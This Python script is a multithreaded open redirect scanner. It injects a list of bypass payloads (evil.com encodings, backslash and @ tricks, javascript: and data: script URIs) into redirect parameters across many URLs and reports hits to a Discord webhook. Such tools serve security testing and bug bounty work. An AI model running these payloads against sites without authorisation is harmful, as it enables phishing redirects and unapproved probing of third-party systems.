#!/usr/bin/env python3
"""
Open Redirect Vulnerability Tester
Tests URLs for open redirect vulnerabilities using various payloads
"""

import requests
import argparse
import sys
import re
import json
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import warnings

# Suppress SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

# Color codes
RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[0;34m'
NC = '\033[0m'

# Thread-safe printing and tracking
print_lock = Lock()
seen_vulnerabilities = set()  # Track unique vulnerabilities

# Test payloads - multiple techniques
PAYLOADS = [
    # External domain redirects
    'https://evil.com',
    'http://evil.com',
    '//evil.com',
    '///evil.com',
    '////evil.com',
    'https://evil.com/',
    'https:evil.com',

    # Protocol-relative
    '//google.com',
    '///google.com',

    # Special characters and bypasses
    'https://evil.com%00',
    'https://evil.com%0d%0a',
    'https://evil.com%23',
    'https://evil.com%3f',

    # Backslash variations
    'https://evil.com\\',
    'https:\\evil.com',
    'https:/\\/evil.com',

    # @ symbol bypasses
    'https://legitimate.com@evil.com',
    'https://evil.com%40legitimate.com',

    # Dot variations
    'https://evil.com.',
    'https://evil。com',

    # Unicode/IDN bypasses
    'https://evil。com',
    'https://evil%E3%80%82com',

    # JavaScript protocol
    'javascript:alert(document.domain)',
    'javascript:alert(1)',
    'javascript://evil.com%0Aalert(1)',

    # Data URIs
    'data:text/html,<script>alert(document.domain)</script>',

    # Whitespace bypasses
    'https://evil.com%20',
    'https://evil.com\t',
    'https://evil.com\n',
    ' https://evil.com',

    # Encoding bypasses
    'https%3A%2F%2Fevil.com',
    'https%3a%2f%2fevil.com',

    # Open Redirect common test domains
    'https://redirect-test.com',
    'http://burpcollaborator.net',
]

# Parameters commonly used for redirects
REDIRECT_PARAMS = [
    'url', 'redirect', 'redir', 'return', 'next', 'destination', 'dest',
    'continue', 'view', 'target', 'to', 'out', 'link', 'site', 'location',
    'domain', 'reference', 'ref', 'path', 'window', 'uri', 'forward',
    'forwardurl', 'goto', 'go', 'ReturnUrl', 'redirect_url', 'redirect_uri',
    'redirectUrl', 'redirectUri', 'return_url', 'returnUrl', 'next_url',
    'nextUrl', 'callback', 'callback_url', 'callbackUrl', 'continue_url',
    'continueUrl', 'success_url', 'successUrl'
]

def safe_print(message):
    """Thread-safe printing"""
    with print_lock:
        print(message)

def send_discord_notification(webhook_url, vulnerability):
    """
    Send Discord notification when vulnerability is found
    """
    if not webhook_url:
        return

    try:
        # Rate limiting - wait between notifications to avoid Discord rate limits
        time.sleep(0.5)

        embed = {
            "embeds": [{
                "title": "🚨 Open Redirect Vulnerability Found!",
                "description": f"**URL:** {vulnerability['original']}\n**Parameter:** {vulnerability['parameter']}",
                "color": 15158332,  # Red color
                "fields": [
                    {
                        "name": "Vulnerable URL",
                        "value": f"```{vulnerability['url'][:1000]}```",
                        "inline": False
                    },
                    {
                        "name": "Payload",
                        "value": f"`{vulnerability['payload']}`",
                        "inline": True
                    },
                    {
                        "name": "Status Code",
                        "value": f"`{vulnerability['status']}`",
                        "inline": True
                    },
                    {
                        "name": "Detection Method",
                        "value": f"`{vulnerability['reason']}`",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "Open Redirect Scanner"
                }
            }]
        }

        # Reduced timeout from 10s to 3s to prevent hanging
        response = requests.post(webhook_url, json=embed, timeout=3)
        if response.status_code == 204:
            safe_print(f"{GREEN}[✓] Discord notification sent{NC}")
        else:
            safe_print(f"{YELLOW}[!] Discord notification failed: HTTP {response.status_code}{NC}")
    except requests.exceptions.Timeout:
        safe_print(f"{YELLOW}[!] Discord notification timeout - continuing scan{NC}")
    except requests.exceptions.RequestException as e:
        safe_print(f"{YELLOW}[!] Discord notification error: {type(e).__name__} - continuing scan{NC}")
    except Exception as e:
        safe_print(f"{YELLOW}[!] Discord error: {str(e)[:50]} - continuing scan{NC}")

def is_open_redirect(original_url, test_url, response, payload):
    """
    Check if the response indicates an open redirect vulnerability
    """
    # Test domains to check for
    test_domains = ['evil.com', 'google.com', 'redirect-test.com', 'burpcollaborator.net']

    # Check status codes that indicate redirects
    if response.status_code in [301, 302, 303, 307, 308]:
        location = response.headers.get('Location', '')

        if not location:
            return False, None

        # Handle protocol-relative redirects (//evil.com)
        if location.startswith('//'):
            # Extract domain from protocol-relative URL
            redirect_domain = location.split('/')[2].lower() if len(location.split('/')) > 2 else ''
            if any(domain in redirect_domain for domain in test_domains):
                return True, f"Protocol-relative redirect to external domain: {location}"

        # Parse the Location header to extract the actual redirect domain
        try:
            # Handle relative redirects (starts with /)
            if location.startswith('/'):
                # Relative redirect - not an open redirect
                return False, None

            # Parse the redirect URL
            parsed_redirect = urlparse(location)
            redirect_domain = parsed_redirect.netloc.lower()

            # Get the original domain for comparison
            original_parsed = urlparse(original_url)
            original_domain = original_parsed.netloc.lower()

            # Check if redirecting to one of our test domains
            # Must be the ACTUAL domain being redirected to, not just in parameters
            if any(domain in redirect_domain and domain != original_domain for domain in test_domains):
                # Additional validation: make sure it's not just in a parameter
                # The domain should be the netloc itself
                for test_domain in test_domains:
                    if redirect_domain == test_domain or redirect_domain.endswith('.' + test_domain):
                        return True, f"HTTP redirect to external domain: {location}"

        except Exception:
            # If parsing fails, check if it's a simple domain redirect
            location_lower = location.lower()
            # Only flag if the test domain appears at the start (not in parameters)
            for test_domain in test_domains:
                if location_lower.startswith(f'http://{test_domain}') or location_lower.startswith(f'https://{test_domain}') or location_lower.startswith(f'//{test_domain}'):
                    return True, f"Redirect to external domain: {location}"

    # Check response body for meta refresh or JavaScript redirects
    if response.status_code == 200:
        content = response.text.lower()

        # Meta refresh check
        meta_refresh = re.search(r'<meta[^>]*http-equiv=["\']refresh["\'][^>]*content=["\'][^"\']*url=([^"\']+)', content, re.IGNORECASE)
        if meta_refresh:
            redirect_url = meta_refresh.group(1)
            try:
                parsed_meta = urlparse(redirect_url)
                meta_domain = parsed_meta.netloc.lower()

                for test_domain in test_domains:
                    if meta_domain == test_domain or meta_domain.endswith('.' + test_domain):
                        return True, f"Meta refresh redirect to external domain: {redirect_url}"
            except Exception:
                # Fallback to simple check
                for test_domain in test_domains:
                    if redirect_url.lower().startswith(f'http://{test_domain}') or redirect_url.lower().startswith(f'https://{test_domain}'):
                        return True, f"Meta refresh redirect: {redirect_url}"

        # JavaScript redirect check
        js_patterns = [
            r'window\.location\s*=\s*["\']([^"\']+)["\']',
            r'window\.location\.href\s*=\s*["\']([^"\']+)["\']',
            r'document\.location\s*=\s*["\']([^"\']+)["\']',
            r'location\.href\s*=\s*["\']([^"\']+)["\']',
        ]

        for pattern in js_patterns:
            js_redirect = re.search(pattern, content, re.IGNORECASE)
            if js_redirect:
                redirect_url = js_redirect.group(1)
                try:
                    parsed_js = urlparse(redirect_url)
                    js_domain = parsed_js.netloc.lower()

                    for test_domain in test_domains:
                        if js_domain == test_domain or js_domain.endswith('.' + test_domain):
                            return True, f"JavaScript redirect to external domain: {redirect_url}"
                except Exception:
                    # Fallback to simple check
                    for test_domain in test_domains:
                        if redirect_url.lower().startswith(f'http://{test_domain}') or redirect_url.lower().startswith(f'https://{test_domain}'):
                            return True, f"JavaScript redirect: {redirect_url}"

    return False, None

def test_url(url, timeout=10, webhook_url=None):
    """
    Test a single URL for open redirect vulnerabilities
    """
    results = []

    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        # Find redirect parameters
        redirect_params_found = [p for p in params.keys() if p.lower() in [rp.lower() for rp in REDIRECT_PARAMS]]

        if not redirect_params_found:
            # Try to identify potential redirect params
            redirect_params_found = [p for p in params.keys()]

        # Test each redirect parameter found
        for param in redirect_params_found:
            # Create unique identifier for this URL + parameter combination
            unique_key = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}"

            # Skip if we've already found a vulnerability for this URL + parameter
            if unique_key in seen_vulnerabilities:
                continue

            for payload in PAYLOADS:
                try:
                    # Create new URL with payload
                    new_params = params.copy()
                    new_params[param] = [payload]

                    new_query = urlencode(new_params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        new_query,
                        parsed.fragment
                    ))

                    # Make request with redirects disabled
                    response = requests.get(
                        test_url,
                        allow_redirects=False,
                        timeout=timeout,
                        verify=False,
                        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                    )

                    # Check if vulnerable
                    is_vuln, reason = is_open_redirect(url, test_url, response, payload)

                    if is_vuln:
                        # Add to seen vulnerabilities set
                        with print_lock:
                            if unique_key not in seen_vulnerabilities:
                                seen_vulnerabilities.add(unique_key)

                                result = {
                                    'url': test_url,
                                    'original': url,
                                    'parameter': param,
                                    'payload': payload,
                                    'reason': reason,
                                    'status': response.status_code
                                }
                                results.append(result)

                                safe_print(f"{RED}[VULNERABLE]{NC} {test_url}")
                                safe_print(f"  └─ Parameter: {param} | Payload: {payload} | Reason: {reason}")

                                # Send Discord notification
                                send_discord_notification(webhook_url, result)

                        break  # Found vulnerability, no need to test more payloads for this param

                except requests.exceptions.RequestException:
                    # Skip on request errors
                    continue
                except Exception:
                    continue

    except Exception as e:
        pass

    return results

def test_urls_from_file(input_file, output_file, threads=50, webhook_url=None):
    """
    Test multiple URLs from a file
    """
    try:
        with open(input_file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        safe_print(f"{RED}Error: File '{input_file}' not found{NC}")
        sys.exit(1)

    total = len(urls)
    safe_print(f"{BLUE}[*] Testing {total} URLs with {threads} threads...{NC}\n")

    if webhook_url:
        safe_print(f"{GREEN}[*] Discord notifications enabled{NC}\n")

    all_results = []
    completed = 0

    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_url = {executor.submit(test_url, url, 10, webhook_url): url for url in urls}

        for future in as_completed(future_to_url):
            completed += 1
            url = future_to_url[future]

            try:
                results = future.result()
                if results:
                    all_results.extend(results)

                # Progress indicator
                if completed % 10 == 0 or completed == total:
                    safe_print(f"{YELLOW}[*] Progress: {completed}/{total}{NC}")

            except Exception as e:
                pass

    # Write results to file
    if all_results:
        with open(output_file, 'w') as f:
            f.write("# Open Redirect Vulnerabilities Found\n")
            f.write("# Generated by Open Redirect Scanner\n\n")

            for result in all_results:
                f.write(f"[VULNERABLE] {result['url']}\n")
                f.write(f"  Original URL: {result['original']}\n")
                f.write(f"  Parameter: {result['parameter']}\n")
                f.write(f"  Payload: {result['payload']}\n")
                f.write(f"  Reason: {result['reason']}\n")
                f.write(f"  Status Code: {result['status']}\n")
                f.write("\n")

        safe_print(f"\n{GREEN}[✓] Found {len(all_results)} potential vulnerabilities{NC}")
        safe_print(f"{BLUE}[*] Results saved to: {output_file}{NC}")
    else:
        # Create empty file to indicate scan completed
        with open(output_file, 'w') as f:
            f.write("# No open redirect vulnerabilities found\n")

        safe_print(f"\n{YELLOW}[*] No vulnerabilities found{NC}")

def main():
    parser = argparse.ArgumentParser(
        description='Open Redirect Vulnerability Tester',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument('-l', '--list', required=True, help='Input file containing URLs')
    parser.add_argument('-o', '--output', required=True, help='Output file for results')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Number of threads (default: 50)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('-w', '--webhook', help='Discord webhook URL for notifications')

    args = parser.parse_args()

    test_urls_from_file(args.list, args.output, args.threads, args.webhook)

if __name__ == '__main__':
    main()
